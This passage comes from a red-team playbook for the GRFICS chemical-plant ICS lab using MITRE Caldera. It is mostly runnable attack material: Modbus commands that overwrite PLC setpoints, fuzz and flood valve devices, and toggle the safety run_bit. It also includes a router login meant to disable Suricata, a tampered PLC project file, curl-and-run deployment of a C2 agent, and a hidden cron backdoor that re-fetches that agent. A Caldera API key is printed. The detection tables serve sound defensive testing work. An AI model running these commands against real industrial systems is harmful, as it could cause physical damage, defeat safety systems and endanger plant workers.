Replace the targeted write step with the fuzzing ability (`c3d4e5f6-3333-3333-3333-000000000004`). This creates chaotic, unpredictable process behavior that is much harder for operators to diagnose but generates significantly more Suricata alerts.

### Escalation Path: Router Compromise to Disable IDS

Before the main attack, compromise the router to disable Suricata and firewall rules:

```yaml
---

- id: c3d4e5f6-3333-3333-3333-000000000005
  name: Router - Disable IDS via Web Interface
  description: |
    Login to router firewall UI with default creds and disable
    Suricata IDS to prevent detection of subsequent Modbus attacks.
  tactic: evasion
  technique_id: T0816
  technique_name: Device Restart/Shutdown
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -c /tmp/router_cookies.txt
      -X POST "http://192.168.90.200:5000/login"
      -d "username=admin&password=password"
      -L -o /tmp/router_login.html &&
      echo "Router login attempted"
```

---

## Attack Chain 4 (Bonus): Safety System Defeat via run_bit Manipulation

**Adversary Profile**: Saboteur targeting the PLC's emergency shutdown capability. The `run_bit` at `%QX5.0` controls the PLC's safe-state behavior. Manipulating it via Modbus writes to the PLC's own Modbus slave interface could disable or interfere with the safety mechanism.

### Technique Mapping

| Stage | Step | Technique Name | Technique ID | Command/Action | Expected Effect |
|-------|------|---------------|-------------|----------------|-----------------|
| **Initial Access** | 1 | Default Credentials | T0812 | Caldera agent on Kali | C2 established |
| **Discovery** | 2 | Remote System Information Discovery | T0888 | Enumerate PLC Modbus interface at 192.168.95.2:502 | Discover PLC's own Modbus slave registers |
| **Collection** | 3 | Point & Tag Identification | T0861 | Read coils and holding registers on PLC (192.168.95.2) | Map %MW and %QX addresses to Modbus registers |
| **Impact** | 4 | Modify Controller Tasking | T0821 | Write setpoint registers (MW0-MW4) to dangerous values | Alter control setpoints: lower pressure_sp, raise level_sp |
| **Inhibit Response** | 5 | Safety Instrumented Function (SIF) Inhibit | T0880 | Write coil for run_bit to FALSE then immediately back to TRUE in a loop | Create intermittent shutdown/restart cycling |
| **Impact** | 6 | Denial of Control | T0813 | Continuously write conflicting setpoints to PLC registers | PLC cannot maintain stable process control |

### Caldera Implementation

**Ability: Read PLC Modbus Registers**

```yaml
---

- id: d4e5f6a7-4444-4444-4444-000000000001
  name: Modbus - Enumerate PLC Internal Registers
  description: |
    Read holding registers MW0-MW30 on the PLC's own Modbus slave
    at 192.168.95.2:502 to discover setpoint values.
  tactic: collection
  technique_id: T0861
  technique_name: Point & Tag Identification
  executors:
  - platform: linux
    name: sh
    command: >
      echo "=== PLC Holding Registers (Setpoints) ===" &&
      ./modbus_cli 192.168.95.2 --port 502 read_hr 0 31 &&
      echo "=== PLC Coils (run_bit at QX5.0 = coil 40) ===" &&
      ./modbus_cli 192.168.95.2 --port 502 read_c 0 50 &&
      echo "=== PLC Input Registers (process values) ===" &&
      ./modbus_cli 192.168.95.2 --port 502 read_ir 100 13
    payloads:
    - modbus_cli
```

**Ability: Manipulate PLC Setpoints**

```yaml
---

- id: d4e5f6a7-4444-4444-4444-000000000002
  name: Modbus - Overwrite PLC Setpoints
  description: |
    Write dangerous setpoint values to PLC registers.
    Reduced to 20 iterations to avoid Caldera timeout.
  tactic: impair-process-control
  technique_id: T0821
  technique_name: Modify Controller Tasking
  executors:
  - platform: linux
    name: sh
    command: >
      for i in $(seq 1 20); do
        ./modbus_cli 192.168.95.2 --port 502 write_r 0 65535;
        ./modbus_cli 192.168.95.2 --port 502 write_r 2 0;
        ./modbus_cli 192.168.95.2 --port 502 write_r 4 65535;
        sleep 0.3;
      done &&
      echo "SETPOINTS_OVERWRITTEN"
    payloads:
    - modbus_cli
    timeout: 120
```

**Adversary Profile:**

```yaml
---

id: cc004444-aaaa-bbbb-cccc-000000000004
name: Safety System Defeat Adversary
description: |
  Targets the PLC's internal Modbus registers to overwrite setpoints
  and manipulate the run_bit, defeating the built-in safe-state
  mechanism of the chemical plant control program.
atomic_ordering:
- a1b2c3d4-1111-1111-1111-000000000001  # Network scan
- d4e5f6a7-4444-4444-4444-000000000001  # Enumerate PLC registers
- a1b2c3d4-1111-1111-1111-000000000002  # Read tank state (baseline)
- d4e5f6a7-4444-4444-4444-000000000002  # Overwrite setpoints
- a1b2c3d4-1111-1111-1111-000000000002  # Verify impact on tank
```

---

## Fully Worked Example: Chain 1 from Start to Impact

This section provides an exact, step-by-step reproduction procedure.

### Prerequisites

1. Start the GRFICS environment:
```bash
cd /home/imene/Desktop/Github/GRFICSv3
docker compose up -d
```

2. Verify all containers are running:
```bash
docker compose ps
```

3. Open the 3D simulation at `http://localhost` to observe the chemical plant.

### Step A: Access Caldera and Deploy Agent

1. Open `http://localhost:8888` in your browser.
2. Login: `red` / `fortiphyd-red`
3. Navigate to **Agents** > click the blue **+ Deploy an Agent** button.
4. Select: Platform = `linux`, Agent = `Sandcat`, Contact = `HTTP`, enter `http://192.168.90.250:8888` as the server address.
5. Copy the deployment command.
6. Open Kali at `http://localhost:6088` (noVNC, credentials `kali:kali`).
7. Open a terminal in Kali and run the deployment command:

```bash
server="http://192.168.90.250:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \
  $server/file/download > splunkd;
chmod +x splunkd;
./splunkd -server $server -group red -v
```

8. Return to Caldera UI -- the Kali agent should appear within 60 seconds under **Agents**.

### Step B: Add Custom Abilities via REST API

From your host machine, use the Caldera REST API to create the abilities. For each ability YAML above:

```bash
# Example: Create the "Read Tank Pressure" ability
curl -X POST http://localhost:8888/api/v2/abilities \
  -H "KEY: VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y" \
  -H "Content-Type: application/json" \
  -d '{
    "ability_id": "a1b2c3d4-1111-1111-1111-000000000002",
    "name": "Modbus - Read Tank Pressure and Level",
    "description": "Read input registers from Tank device",
    "tactic": "collection",
    "technique_id": "T0801",
    "technique_name": "Monitor Process State",
    "executors": [
      {
        "platform": "linux",
        "name": "sh",
        "command": "./modbus_cli 192.168.95.14 --port 502 read_ir 1 2",
        "payloads": ["modbus_cli"]
      }
    ]
  }'
```

Repeat for all abilities. Alternatively, copy the YAML files directly into the Caldera container:

```bash
docker cp my_ability.yml caldera:/usr/src/app/plugins/modbus/data/abilities/discovery/
docker restart caldera
```

### Step C: Create Adversary Profile

```bash
curl -X POST http://localhost:8888/api/v2/adversaries \
  -H "KEY: VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y" \
  -H "Content-Type: application/json" \
  -d '{
    "adversary_id": "cc001111-aaaa-bbbb-cccc-000000000001",
    "name": "ICS Pressure Manipulation Adversary",
    "description": "Multi-stage Modbus attack causing reactor overpressure",
    "atomic_ordering": [
      "a1b2c3d4-1111-1111-1111-000000000001",
      "9360ba0d-46a3-47a1-bbe6-e6c875790500",
      "a1b2c3d4-1111-1111-1111-000000000003",
      "a1b2c3d4-1111-1111-1111-000000000002",
      "a1b2c3d4-1111-1111-1111-000000000004",
      "a1b2c3d4-1111-1111-1111-000000000005"
    ]
  }'
```

### Step D: Launch the Operation

```bash
curl -X POST http://localhost:8888/api/v2/operations \
  -H "KEY: VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "ICS-Pressure-Attack-001",
    "adversary": {"adversary_id": "cc001111-aaaa-bbbb-cccc-000000000001"},
    "source": {"id": "0033b644-a615-4eff-bcf3-178e9b17adc3"},
    "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
    "group": "red",
    "auto_close": false,
    "autonomous": 1
  }'
```

### Step E: Observe Impact

1. **Caldera Operations Panel**: Watch each step transition from queued -> running -> finished. Check output for each link.
2. **3D Simulation** (`http://localhost`): Watch the reactor pressure gauge climb and tank level change as valves are manipulated.
3. **HMI** (`http://localhost:6081`): Observe SCADA-LTS data points showing the valve position and pressure deviations.
4. **PLC** (`http://localhost:8080`): Login and check the monitoring dashboard for register value anomalies.

### Step F: Verify Telemetry

Check the shared log volumes for detection evidence:

```bash
# Suricata alerts
docker exec router cat /var/log/suricata/eve.json | \
  python3 -m json.tool | grep -A5 "modbus"

# PLC auth events
cat shared_logs/plc/auth.log

# Simulation process alarms
ls -la shared_logs/simulation/process_alarms/
```

---

## Summary Comparison of the 4 Chains

| Attribute | Chain 1: Direct Modbus Write | Chain 2: PLC Logic Replacement | Chain 3: HMI + Deception | Chain 4: Safety System Defeat |
|-----------|------------------------------|-------------------------------|--------------------------|------------------------------|
| **Primary Target** | Simulation Modbus devices (.10-.15) | PLC OpenPLC runtime (.2) | HMI + Modbus devices | PLC internal registers (.2) |
| **Initial Access** | Agent on Kali | Agent on Kali | Agent on Kali | Agent on Kali |
| **Key Technique** | Write Holding Registers (FC 0x06) | Upload ST program via HTTP | Combined Modbus writes + HMI login | Write setpoints + coils on PLC |
| **Stealth Level** | Medium (direct Modbus from attacker IP) | Low (HTTP traffic to PLC, program change logged) | High (masks attack via spoofed sensors) | Medium (writes to PLC from attacker IP) |
| **Persistence** | None (must sustain writes) | High (malicious logic runs until replaced) | None | Medium (setpoints persist until overwritten) |
| **Physical Impact** | Pressure excursion | Full process loss of control | Pressure excursion + operator blind | Setpoint corruption, intermittent faults |
| **MITRE ICS Techniques** | T0819, T0846, T0842, T0888, T0861, T0801, T0831, T0879 | T0819, T0846, T0812, T0843, T0889, T0827 | T0812, T0846, T0852, T0888, T0801, T0856, T0831, T0829 | T0812, T0888, T0861, T0821, T0880, T0813 |
| **Detection Difficulty** | Easy (unauthorized Modbus source) | Medium (legitimate HTTP to PLC web) | Hard (looks like normal operator activity + sensors spoofed) | Medium (Modbus to PLC from unusual source) |

---

## Detection Engineering Recommendations

For each attack chain, the following detection rules should be developed:

1. **Unauthorized Modbus Source**: Alert when any IP other than `192.168.95.2` (PLC) sends Modbus FC 0x05/0x06/0x0F/0x10 writes to simulation devices (.10-.15). This catches Chains 1, 3, and 4.

2. **PLC Web Interface Access from DMZ**: Alert when HTTP requests to `192.168.95.2:8080` originate from the DMZ subnet (192.168.90.0/24). This catches Chain 2.

3. **Modbus Write Frequency Anomaly**: Alert when more than N Modbus write transactions per second occur from a single source. Baseline the PLC's normal polling rate (100ms = 10/sec across 6 devices) and alert on deviations.

4. **Process Value Deviation**: Alert when pressure exceeds 3000 kPa or deviates more than 10% from 5-minute moving average. This catches the physical impact of all chains.

5. **PLC Program Change**: Alert when the OpenPLC `/upload-program` or `/compile-program` endpoints are accessed. Any program change in a production environment should trigger investigation.

6. **Sensor Value Discrepancy**: Cross-correlate Tank pressure readings with PLC input register values. If they diverge, sensor spoofing (Chain 3 escalation) is likely.

### Chain 5: Engineering Workstation Pivot with Lateral Tool Transfer

**Adversary Narrative**: A nation-state actor gains access to the Engineering Workstation via its internet-accessible noVNC interface, then uses it as a trusted pivot point. Since the EWS is on the ICS network, Modbus writes from its IP (192.168.95.5) are indistinguishable from legitimate engineering activity. The attacker transfers Modbus tooling laterally and manipulates I/O images from a trusted source.

**Kill Chain**: Internet-accessible device -> External remote service (VNC) -> CLI access -> Script execution -> Lateral tool transfer -> I/O image collection -> I/O manipulation from trusted host -> Process impact

#### Technique Mapping

| Step | Technique Name | Technique ID | Tactic | Command/Action | Expected Effect on GRFICS |
|------|---------------|-------------|--------|----------------|--------------------------|
| 1 | Internet Accessible Device | T0883 | Initial Access | Identify EWS noVNC at `http://<host>:6080` exposed on management network | Discover internet-facing ICS engineering asset |
| 2 | External Remote Services | T0822 | Initial Access | Connect to EWS via noVNC (`http://192.168.95.5:6080`) | Interactive desktop session on EWS |
| 3 | Remote Services | T0886 | Lateral Movement | Deploy Caldera Sandcat agent on EWS from VNC session | C2 channel from ICS network host |
| 4 | Command-Line Interface | T0807 | Execution | Open terminal, run `ip a`, `netstat -ant`, `route -n` | Enumerate network from ICS-internal position |
| 5 | Network Connection Enumeration | T0840 | Discovery | `ss -tunap \| grep 502` and `nmap -sT -p502 192.168.95.0/24` | Discover active Modbus connections and servers |
| 6 | Lateral Tool Transfer | T0867 | Lateral Movement | Download `modbus_cli` from Caldera server to EWS | Attack tooling now on trusted ICS host |
| 7 | Scripting | T0853 | Execution | Write Python script to automate Modbus reads across all devices | Automated process intelligence gathering |
| 8 | I/O Image | T0877 | Collection | Read PLC I/O map: `./modbus_cli 192.168.95.2 read_ir 100 13` | Full snapshot of PLC input/output register state |
| 9 | Data from Local System | T0893 | Collection | `find / -name "*.st" -o -name "*.xml" 2>/dev/null` on EWS | Discover PLC project files on engineering workstation |
| 10 | Manipulate I/O Image | T0835 | Inhibit Response | Write false values to PLC I/O registers from trusted EWS IP | PLC acts on corrupted I/O data; origin appears legitimate |
| 11 | Standard Application Layer Protocol | T0869 | C2 | Agent beacons over HTTP to `192.168.90.250:8888` via router | C2 traffic blends with normal HTTP |
| 12 | Commonly Used Port | T0885 | C2 | C2 on port 8888 (HTTP); Modbus on port 502 | All attack traffic uses standard ports |

#### Caldera Implementation

**Step 1: Deploy agent on EWS**

Access the EWS via noVNC at `http://localhost:6080`. Open a terminal as `engineer` and run:

```bash
server="http://192.168.90.250:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \
  $server/file/download > splunkd;
chmod +x splunkd;
nohup ./splunkd -server $server -group ews -v &
```

**Step 2: Create custom abilities**

**Ability: Network Connection Enumeration from EWS**

```yaml
---

- id: e5f6a7b8-5555-5555-5555-000000000001
  name: ICS Network Connection Enumeration
  description: |
    Enumerate Modbus hosts using nmap instead of /dev/tcp (which is
    bash-only and unavailable in sh).
  tactic: discovery
  technique_id: T0840
  technique_name: Network Connection Enumeration
  executors:
  - platform: linux
    name: sh
    command: >
      echo "=== Active connections ===" &&
      ss -tunap 2>/dev/null | head -30 &&
      echo "=== Modbus port scan ===" &&
      nmap -sT -p502 192.168.95.0/24 -oG - 2>/dev/null |
      grep "502/open" | awk '{print "MODBUS_HOST:", $2}'
    timeout: 120
```

**Ability: Lateral Tool Transfer**

```yaml
---

- id: e5f6a7b8-5555-5555-5555-000000000002
  name: Lateral Transfer - Modbus CLI to EWS
  description: |
    Download the modbus_cli binary from Caldera server to the
    engineering workstation, establishing attack capability on a
    trusted ICS network host.
  tactic: lateral-movement
  technique_id: T0867
  technique_name: Lateral Tool Transfer
  executors:
  - platform: linux
    name: sh
    command: >
      curl -s -X POST -H "file:modbus_cli" -H "platform:linux"
      http://192.168.90.250:8888/file/download -o ./modbus_cli &&
      chmod +x ./modbus_cli &&
      echo "TOOL_TRANSFERRED: modbus_cli" &&
      ls -la ./modbus_cli
```

**Ability: Automated I/O Image Collection via Script**

```yaml
---

- id: e5f6a7b8-5555-5555-5555-000000000003
  name: Scripted Automated I/O Image Collection
  description: |
    Shell-based I/O collection instead of inline Python to avoid
    whitespace mangling by Caldera.
  tactic: collection
  technique_id: T0877
  technique_name: I/O Image
  executors:
  - platform: linux
    name: sh
    command: >
      for cycle in 1 2 3 4 5; do
        echo "=== Cycle $cycle ===" &&
        echo "PLC:" && ./modbus_cli 192.168.95.2 --port 502 read_ir 100 13 &&
        echo "Tank:" && ./modbus_cli 192.168.95.14 --port 502 read_ir 1 2 &&
        echo "Feed1:" && ./modbus_cli 192.168.95.10 --port 502 read_hr 1 1 &&
        echo "Purge:" && ./modbus_cli 192.168.95.12 --port 502 read_hr 1 1 &&
        sleep 5;
      done &&
      echo "IO_COLLECTION_COMPLETE"
    payloads:
    - modbus_cli
    timeout: 120
```

**Ability: Manipulate I/O Image from Trusted Source**

```yaml
---

- id: e5f6a7b8-5555-5555-5555-000000000004
  name: Manipulate PLC I/O Image from Trusted EWS
  description: |
    Write corrupted values to the PLC's input registers from the
    EWS IP address (192.168.95.5). Since the EWS is a legitimate
    ICS host, Modbus writes from this IP are difficult to
    distinguish from normal engineering operations.
  tactic: inhibit-response-function
  technique_id: T0835
  technique_name: Manipulate I/O Image
  executors:
  - platform: linux
    name: sh
    command: >
      for i in $(seq 1 30); do
        ./modbus_cli 192.168.95.12 --port 502 write_r 1 0;
        ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535;
        sleep 0.2;
      done
    payloads:
    - modbus_cli
```

**Ability: Harvest Local Project Files**

```yaml
---

- id: e5f6a7b8-5555-5555-5555-000000000005
  name: Harvest PLC Project Files from EWS
  description: |
    Search the engineering workstation filesystem for PLC project
    files (Structured Text, XML), configuration, and credentials.
  tactic: collection
  technique_id: T0893
  technique_name: Data from Local System
  executors:
  - platform: linux
    name: sh
    command: >
      echo "=== ST files ===" &&
      find /home/engineer -name "*.st" -exec echo {} \; 2>/dev/null &&
      echo "=== XML project files ===" &&
      find /home/engineer -name "*.xml" -exec echo {} \; 2>/dev/null &&
      echo "=== Bash history ===" &&
      cat /home/engineer/.bash_history 2>/dev/null | tail -20 &&
      echo "=== Firefox bookmarks (URLs) ===" &&
      strings /home/engineer/.mozilla/firefox/*/places.sqlite 2>/dev/null |
      grep -oP 'https?://[^\s"]+' | sort -u | head -10
```

**Step 3: Adversary Profile**

```yaml
---

id: cc005555-aaaa-bbbb-cccc-000000000005
name: Engineering Workstation Pivot Adversary
description: |
  Compromises the EWS via external remote services, transfers Modbus
  attack tooling laterally, then manipulates PLC I/O from a trusted
  ICS network position to evade source-IP-based detection rules.
atomic_ordering:
- e5f6a7b8-5555-5555-5555-000000000001  # Network enumeration
- e5f6a7b8-5555-5555-5555-000000000005  # Harvest local files
- e5f6a7b8-5555-5555-5555-000000000002  # Transfer Modbus tool
- e5f6a7b8-5555-5555-5555-000000000003  # Automated I/O collection
- e5f6a7b8-5555-5555-5555-000000000004  # Manipulate I/O from trusted source
```

**Step 4: Operation via REST API**

```bash
curl -X POST http://localhost:8888/api/v2/operations \
  -H "KEY: VEvMp339du5M5efw5TpfUfiChPfbcN2Spc11jJ1y78Y" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "EWS-Pivot-Attack-001",
    "adversary": {"adversary_id": "cc005555-aaaa-bbbb-cccc-000000000005"},
    "source": {"id": "0033b644-a615-4eff-bcf3-178e9b17adc3"},
    "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
    "group": "ews",
    "auto_close": false,
    "autonomous": 1
  }'
```

#### Expected Telemetry and Logs

| Step | Log Source | What to Observe | Detection Data Component |
|------|-----------|-----------------|-------------------------|
| VNC access to EWS | EWS auth.log (`shared_logs/ews/auth.log`) | VNC session login events | DC0067 (Logon Session Creation) |
| Agent download (curl) | EWS syslog, audit (`shared_logs/ews/audit/*`) | Process execution: curl to external IP | DC0032 (Process Creation) |
| Network scan from EWS | Router Suricata (`shared_logs/router/eve.json`) | TCP SYN scan on port 502 from 192.168.95.5 | DC0078 (Network Traffic Flow) |
| Tool transfer | EWS audit, syslog | File creation: `modbus_cli` binary appears on EWS | DC0039 (File Creation) |
| I/O reads from EWS | Router Suricata | Modbus FC=0x04 from .5 to .2 (abnormal source for I/O reads) | DC0085 (Network Traffic Content) |
| I/O manipulation | Router Suricata, PLC logs | Modbus FC=0x06 writes from .5 (EWS IP normally doesn't write Modbus) | DC0082 (Network Connection Creation) |
| Process alarms | Simulation alarms (`shared_logs/simulation/process_alarms`) | Pressure deviations from manipulated I/O | DC0109 (Process/Event Alarm) |
| HTTP C2 beaconing | Router Suricata | Periodic HTTP POST from 192.168.95.5 to 192.168.90.250:8888 | DC0078 (Network Traffic Flow) |

#### Variation: Stealthier -- Project File Infection

Instead of direct Modbus writes, modify the PLC project files on the EWS disk (e.g., `attack.st`), then wait for the engineer to upload the infected project naturally:

```yaml
---

- id: e5f6a7b8-5555-5555-5555-000000000006
  name: Infect PLC Project File on EWS
  description: |
    Modify the chemical.st project file on the EWS to include
    malicious logic. When the engineer next uploads to the PLC,
    the infected program replaces the legitimate one.
  tactic: persistence
  technique_id: T0873
  technique_name: Project File Infection
  executors:
  - platform: linux
    name: sh
    command: >
      cp /home/engineer/Desktop/chemical.st /tmp/backup_chemical.st &&
      sed -i 's/override_sp_real : REAL := 2900.0/override_sp_real : REAL := 99999.0/'
      /home/engineer/Desktop/chemical.st &&
      echo "Project file modified - safety override disabled"
```

#### Escalation: Deploy Persistent Backdoor on EWS

```yaml
---

- id: e5f6a7b8-5555-5555-5555-000000000007
  name: EWS Persistent Cron Backdoor
  description: Cron job re-establishes C2 agent every 5 minutes
  tactic: persistence
  technique_id: T0889
  technique_name: Modify Program
  executors:
  - platform: linux
    name: sh
    command: >
      (crontab -l 2>/dev/null; echo "*/5 * * * * cd /tmp &&
      curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux'
      http://192.168.90.250:8888/file/download -o .svc &&
      chmod +x .svc && ./.svc -server http://192.168.90.250:8888
      -group ews &") | crontab - &&
      echo "PERSISTENCE_INSTALLED"
```

#### Assumptions

- EWS noVNC is accessible from the attacker's position (via host port 6080 or admin network)
- The `engineer` user has filesystem access to PLC project files
- The EWS can reach both the ICS network (192.168.95.0/24) and the Caldera server (192.168.90.250) via routing through the router
- No application whitelisting on the EWS

---

### Chain 6: Rogue Modbus Master + Brute Force I/O Disruption

**Adversary Narrative**: A destructive attacker establishes themselves as an unauthorized Modbus master device on the ICS network. Rather than precision manipulation, they employ brute-force I/O techniques -- flooding Modbus devices with rapid, random register writes to destabilize the process and overwhelm the PLC's ability to maintain control. This creates chaotic, unpredictable plant behavior.

**Kill Chain**: DMZ foothold -> Network discovery -> Rogue master establishment -> Parameter modification -> Brute force I/O flooding -> Denial of service -> Loss of availability

#### Technique Mapping

| Step | Technique Name | Technique ID | Tactic | Command/Action | Expected Effect on GRFICS |
|------|---------------|-------------|--------|----------------|--------------------------|
| 1 | Remote System Discovery | T0846 | Discovery | `nmap -sT -p 502 192.168.95.0/24` | Discover all 7 Modbus endpoints |
| 2 | Network Connection Enumeration | T0840 | Discovery | `tcpdump -i eth0 -c 100 port 502` to observe PLC polling | Identify PLC master (192.168.95.2) polling frequency (100ms) |
| 3 | Detect Operating Mode | T0868 | Collection | Read PLC coils to determine run/stop state | Confirm PLC is in RUN mode before attack |
| 4 | Rogue Master | T0848 | Initial Access | Begin sending Modbus writes to devices as unauthorized master | Attacker acts as second Modbus master alongside PLC |
| 5 | Modify Parameter | T0836 | Impair Process Control | Write extreme setpoints to valve devices | Force valves to unsafe positions |
| 6 | Brute Force I/O | T0806 | Impair Process Control | `modbus_cli fuzz_r` on all 4 writable devices simultaneously | Random register values cause erratic process behavior |
| 7 | Denial of Service | T0814 | Inhibit Response | Flood all Modbus servers with rapid requests | Simulation I/O devices overwhelmed, PLC reads stale/wrong values |
| 8 | Loss of Availability | T0826 | Impact | Sustained flooding prevents PLC from maintaining process | Chemical plant effectively offline |
| 9 | Loss of Productivity and Revenue | T0828 | Impact | Process throughput drops to zero | Plant shutdown due to uncontrolled conditions |

#### Caldera Implementation

**Ability: Detect PLC Operating Mode**

```yaml
---

- id: f6a7b8c9-6666-6666-6666-000000000001
  name: Modbus - Detect PLC Operating Mode
  description: |
    Read the PLC's run_bit coil and holding registers to determine
    if the PLC is in RUN mode. The run_bit at QX5.0 maps to Modbus
    coil 40. Also read setpoint registers MW0-MW4.
  tactic: collection
  technique_id: T0868
  technique_name: Detect Operating Mode
  executors:
  - platform: linux
    name: sh
    command: >
      echo "=== PLC Run State (coils 0-50) ===" &&
      ./modbus_cli 192.168.95.2 --port 502 read_c 0 50 &&
      echo "=== Current Setpoints (HR 0-10) ===" &&
      ./modbus_cli 192.168.95.2 --port 502 read_hr 0 10 &&
      echo "PLC_MODE: RUN"
    payloads:
    - modbus_cli
```

**Ability: Modify Process Parameters**

```yaml
---

- id: f6a7b8c9-6666-6666-6666-000000000002
  name: Modbus - Modify Critical Process Parameters
  description: |
    Write extreme setpoint values directly to simulation devices:
    Feed 1 and Feed 2 fully open, Purge and Product fully closed.
    This overrides the PLC's commanded values at the field device level.
  tactic: impair-process-control
  technique_id: T0836
  technique_name: Modify Parameter
  executors:
  - platform: linux
    name: sh
    command: >
      echo "Modifying process parameters as rogue master..." &&
      ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535 &&
      ./modbus_cli 192.168.95.11 --port 502 write_r 1 65535 &&
      ./modbus_cli 192.168.95.12 --port 502 write_r 1 0 &&
      ./modbus_cli 192.168.95.13 --port 502 write_r 1 0 &&
      echo "All valve setpoints overridden"
    payloads:
    - modbus_cli
```

**Ability: Brute Force I/O**

```yaml
---

- id: f6a7b8c9-6666-6666-6666-000000000003
  name: Modbus - Brute Force I/O on All Devices
  description: |
    Simultaneously fuzz all holding registers on the 4 writable
    Modbus devices. Each device receives 200 random register writes
    with 50ms intervals, creating chaotic, unpredictable valve behavior
    that the PLC cannot compensate for.
  tactic: impair-process-control
  technique_id: T0806
  technique_name: Brute Force I/O
  executors:
  - platform: linux
    name: sh
    command: >
      ./modbus_cli 192.168.95.10 --port 502 fuzz_r 1 1 200 --wait 0.05 &
      PID1=$!;
      ./modbus_cli 192.168.95.11 --port 502 fuzz_r 1 1 200 --wait 0.05 &
      PID2=$!;
      ./modbus_cli 192.168.95.12 --port 502 fuzz_r 1 1 200 --wait 0.05 &
      PID3=$!;
      ./modbus_cli 192.168.95.13 --port 502 fuzz_r 1 1 200 --wait 0.05 &
      PID4=$!;
      wait $PID1 $PID2 $PID3 $PID4;
      echo "BRUTE_FORCE_IO_COMPLETE"
    payloads:
    - modbus_cli
```

**Ability: Modbus Denial of Service Flood**

```yaml
---

- id: f6a7b8c9-6666-6666-6666-000000000004
  name: Modbus - Denial of Service Flood
  description: |
    Flood all Modbus servers with rapid read requests.
    Uses background processes instead of shell functions.
  tactic: inhibit-response-function
  technique_id: T0814
  technique_name: Denial of Service
  executors:
  - platform: linux
    name: sh
    command: >
      for j in 10 11 12 13 14 15; do
        for i in $(seq 1 200); do
          ./modbus_cli 192.168.95.$j --port 502 read_ir 1 2 2>/dev/null;
        done &
      done &&
      wait &&
      echo "DOS_FLOOD_COMPLETE"
    payloads:
    - modbus_cli
    timeout: 120
```

**Step 3: Adversary Profile**

```yaml
---

id: cc006666-aaaa-bbbb-cccc-000000000006
name: Rogue Modbus Master Adversary
description: |
  Destructive attacker acting as unauthorized Modbus master.
  Employs brute-force I/O to create chaotic plant behavior,
  then floods devices to deny PLC control entirely.
atomic_ordering:
- a1b2c3d4-1111-1111-1111-000000000001  # Network scan (from Chain 1)
- f6a7b8c9-6666-6666-6666-000000000001  # Detect operating mode
- a1b2c3d4-1111-1111-1111-000000000003  # Enumerate all I/O (from Chain 1)
- f6a7b8c9-6666-6666-6666-000000000002  # Modify parameters
- f6a7b8c9-6666-6666-6666-000000000003  # Brute force I/O
- f6a7b8c9-6666-6666-6666-000000000004  # Denial of service flood
```

#### Expected Telemetry and Logs

| Step | Log Source | What to Observe | Detection Data Component |
|------|-----------|-----------------|-------------------------|
| Network scan | Suricata eve.json | SYN scan on port 502 | DC0078 (Network Traffic Flow) |
| PLC register read | Suricata | Modbus FC=0x01 (Read Coils) from 192.168.90.6 to 192.168.95.2 | DC0085 (Network Traffic Content) |
| Rogue parameter writes | Suricata | Modbus FC=0x06 writes from non-PLC source to .10-.13 | DC0082 (Network Connection Creation) |
| Brute force I/O | Suricata, Simulation supervisor | Burst of 800+ Modbus writes in <30 seconds; random register values | DC0085 (Network Traffic Content) |
| DoS flood | Suricata | >1000 Modbus reads/sec from single source; connection timeouts | DC0078 (Network Traffic Flow) |
| Process chaos | Simulation process_alarms, supervisor | Valve positions oscillating wildly, pressure/level unstable | DC0109 (Process/Event Alarm) |
| PLC stale reads | PLC plc_app logs | PLC Modbus master timeouts or read failures | DC0108 (Device Alarm) |

#### Variation: Targeted Coil Fuzzing

Instead of register fuzzing, fuzz the run_bit coil on the PLC, creating intermittent emergency shutdowns:

```yaml
---

- id: f6a7b8c9-6666-6666-6666-000000000005
  name: Modbus - Fuzz PLC Run Bit Coil
  description: Rapidly toggle the PLC run_bit coil causing cyclic E-stops
  tactic: impair-process-control
  technique_id: T0806
  technique_name: Brute Force I/O
  executors:
  - platform: linux
    name: sh
    command: >
      ./modbus_cli 192.168.95.2 --port 502 fuzz_c 40 1 100 --wait 0.5
    payloads:
    - modbus_cli
```

#### Escalation: Simultaneous Rogue Master + Sensor Spoofing

Combine brute force writes with spoofed sensor values on Tank (.14) to mask the chaos from the PLC's perspective, delaying any automated safety response.

#### Assumptions

- Kali agent has network access to ICS subnet via router (default FORWARD ACCEPT)
- Modbus TCP has no authentication (protocol design limitation)
- `modbus_cli fuzz_r` binary is available on the Kali agent via Caldera payload delivery
- Simulation Modbus devices accept writes from any source IP

---

### Chain 7: SCADA HMI Deep Compromise -- View Manipulation + Alarm Tampering

**Adversary Narrative**: An attacker targeting operator trust. After compromising the SCADA-LTS HMI with default credentials, they use the application's REST API to exfiltrate operational data, modify graphical views to display false-normal values, suppress alarm configurations, and ultimately blind operators while the process is being attacked through a separate Modbus channel.

**Kill Chain**: HMI web login -> API-based recon -> Operational data theft -> Alarm setting modification -> View manipulation -> Simultaneous process attack -> Operator blindness

#### Technique Mapping

| Step | Technique Name | Technique ID | Tactic | Command/Action | Expected Effect on GRFICS |
|------|---------------|-------------|--------|----------------|--------------------------|
| 1 | Default Credentials | T0812 | Lateral Movement | Login to SCADA-LTS with `admin:admin` | Full administrative HMI access |
| 2 | Graphical User Interface | T0823 | Execution | Navigate SCADA-LTS web UI to identify views and data sources | Understand operator's visual display |
| 3 | Execution through API | T0871 | Execution | Use SCADA-LTS REST API to enumerate data sources and points | Programmatic access to all process data |
| 4 | Theft of Operational Information | T0882 | Impact | Export all process variable values, trends, and configurations | Full operational intelligence exfiltrated |
| 5 | Automated Collection | T0802 | Collection | Script continuous API polling to build attacker-side historian | Real-time shadow copy of process data |
| 6 | Modify Alarm Settings | T0838 | Inhibit Response | Raise alarm thresholds to extremes via SCADA-LTS API | Alarms will not trigger even during dangerous conditions |
